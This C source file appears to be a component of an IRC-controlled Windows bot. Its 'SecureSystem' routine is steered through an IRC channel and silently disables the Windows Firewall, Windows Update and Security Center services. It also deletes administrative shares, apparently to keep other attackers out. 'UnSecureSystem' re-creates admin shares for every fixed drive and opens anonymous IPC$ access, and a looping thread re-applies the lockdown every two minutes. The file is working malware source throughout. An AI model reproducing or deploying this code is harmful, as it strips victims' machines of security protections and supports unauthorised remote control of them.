#include "includes.h"
#include "extern.h"

#ifndef NO_SECSYSTEM
// globals
int secure_delay=120000;

NetShares ShareList[]={
		{"IPC$",NULL},
		{"ADMIN$",NULL},
		{"C$","C:\\"},
		{"D$","D:\\"}
};

char fad1[]="SYSTEM\\CurrentControlSet\\Services\\SharedAccess";
char fad2[]="SYSTEM\\CurrentControlSet\\Services\\wuauserv";
char fad3[]="SYSTEM\\CurrentControlSet\\Services\\wscsvc";

DWORD WINAPI SecureThread(LPVOID param)
{
	SECURE secure = *((SECURE *)param);
	SECURE *secures = (SECURE *)param;
	secures->gotinfo = TRUE;

	if (secure.secure)
		SecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);
	else
		UnSecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);	

	clearthread(secure.threadnum);

	ExitThread(0);
}

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	HKEY hKey; 
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		TCHAR szDataBuf[]="N"; 
		if(RegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
			sprintf(sendbuf,"[SECURE]: Disable DCOM failed.");
		else
			sprintf(sendbuf,"[SECURE]: DCOM disabled.");
		RegCloseKey(hKey);
	} else
		sprintf(sendbuf,"[SECURE]: Failed to open DCOM registry key.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		DWORD dwData = 0x00000001;
		if (RegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
			sprintf(sendbuf,"[SECURE]: Failed to restrict access to the IPC$ Share.");
		else
			sprintf(sendbuf,"[SECURE]: Restricted access to the IPC$ Share.");			
		RegCloseKey(hKey);
	} else
			sprintf(sendbuf,"[SECURE]: Failed to open IPC$ Restriction registry key.");

	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	// DISABLE SP2 Firewall and Windows update
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, fad1, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		DWORD dwData = 0x4;
		RegSetValueEx(hKey, "Start", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
		RegCloseKey(hKey);
	}
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, fad2, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		DWORD dwData = 0x4;
		RegSetValueEx(hKey, "Start", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
		RegCloseKey(hKey);
	}
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, fad3, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		DWORD dwData = 0x4;
		RegSetValueEx(hKey, "Start", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
		RegCloseKey(hKey);
	}
//end sp2 fuck
	PSHARE_INFO_502 pBuf,p;
	NET_API_STATUS nStatus;
	DWORD entriesread=0,totalread=0,resume=0;
 
	do {
		nStatus = NetShareEnum(NULL, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

		if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
			p = pBuf;
 
			for(unsigned int i=1;i <= entriesread;i++) {
				if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {
					if(ShareDel(NULL,AsAnsiString(p->shi502_netname)) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%S' deleted.",p->shi502_netname);
					else 
						_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to delete '%S' share.",p->shi502_netname);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
					addlog(sendbuf);
				}

				p++;
			}

			NetApiBufferFree(pBuf);
		} else {
			for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) { 
				if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
					_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%s' deleted.",ShareList[i].ShareName);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to delete '%s' share.",ShareList[i].ShareName);
				if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
				addlog(sendbuf);
			} 
		}
	} while (nStatus == ERROR_MORE_DATA);	
	sprintf(sendbuf,"[SECURE]: Network shares deleted.");

	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	HKEY hKey; 
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		TCHAR szDataBuf[]="Y"; 
		if(RegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
			sprintf(sendbuf,"[SECURE]: Enable DCOM failed.");
		else
			sprintf(sendbuf,"[SECURE]: DCOM enabled.");
		RegCloseKey(hKey);
	} else
		sprintf(sendbuf,"[SECURE]: Failed to open DCOM registry key.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		DWORD dwData = 0x00000000;
		if (RegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
			sprintf(sendbuf,"[SECURE]: Failed to unrestrict access to the IPC$ Share.");
		else
			sprintf(sendbuf,"[SECURE]: Unrestricted access to the IPC$ Share.");			
		RegCloseKey(hKey);
	} else
		sprintf(sendbuf,"[SECURE]: Failed to open IPC$ restriction registry key.");

	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) { 
		if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
			_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%s' added.",ShareList[i].ShareName);
		else 
			_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to add '%s' share.",ShareList[i].ShareName);
		if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
		addlog(sendbuf);
	}

	char sharename[10], sharepath[10];
	DWORD dwDrives = GetLogicalDrives();
	for(char cDrive='A'; dwDrives!=0; cDrive++, dwDrives=(dwDrives>>1)) {
		if((dwDrives & 1)==1 && cDrive != 'A') {
			_snprintf(sharename,sizeof(sharename),"%c$",cDrive);
			_snprintf(sharepath,sizeof(sharepath),"%c:\\",cDrive);

			if (GetDriveType(sharepath) == DRIVE_FIXED) {
				if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
					_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Share '%s' added.",sharename);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),"[SECURE]: Failed to add '%s' share.",sharename);
				if (!silent) irc_privmsg(sock,chan,sendbuf,notice);
				addlog(sendbuf);
			}
		}
	}

	sprintf(sendbuf,"[SECURE]: Network shares added.");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

DWORD WINAPI AutoSecure(LPVOID param)
{
	while (1) {
		SecureSystem(0,NULL,FALSE,TRUE);
		Sleep(secure_delay);
	}
	ExitThread (0);
}
#endif
